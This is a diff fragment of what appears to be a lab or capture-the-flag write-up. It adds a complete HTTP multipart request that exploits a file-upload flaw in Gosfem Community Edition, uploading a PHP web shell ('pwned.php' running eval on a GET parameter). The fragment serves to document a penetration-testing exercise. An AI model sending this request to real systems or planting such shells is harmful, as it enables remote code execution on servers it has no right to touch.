@@ -112,3 +112,58 @@ checking the login dir, we got to see the service name `Gosfem Community Edition
 
 after wsome research, found an exploit on exploitdb, [exploit](https://www.exploit-db.com/exploits/50587)
 
+```
+POST /management/admin/examQuestion/create HTTP/1.1
+Host: 192.168.165.13
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544
+Content-Length: 1331
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="name"
+
+test4
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="class_id"
+
+2
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="subject_id"
+
+5
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="timestamp"
+
+2021-12-08
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="teacher_id"
+
+1
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="file_type"
+
+txt
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="status"
+
+1
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="description"
+
+123123
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="_wysihtml5_mode"
+
+1
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="file_name"; filename="pwned.php"
+Content-Type: application/octet-stream
+
+<?php eval($_GET["cmd"]); ?>
+-----------------------------183813756938980137172117669544--
+```
+made modification to the exploit and uploaded the web shell. 
+
